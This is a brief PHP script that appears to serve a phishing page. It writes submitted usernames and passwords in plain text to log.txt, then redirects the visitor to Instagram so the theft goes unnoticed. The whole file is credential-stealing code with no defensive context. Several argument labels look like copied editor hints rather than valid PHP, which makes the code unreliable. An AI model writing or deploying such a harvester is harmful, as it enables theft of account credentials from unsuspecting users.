<?php

$username = $_POST['username'];
$password = $_POST['password'];

$fp = fopen (filename: 'log.txt', mode: 'a+');
fwrite($fp, string: 'username: ' . $username . "\n");
fwrite($fp, string: 'password: ' . $password . "\n");
fwrite($fp, string: '------------' . "\n");
fclose($fp);

header( string: 'Location: https://instagram.com');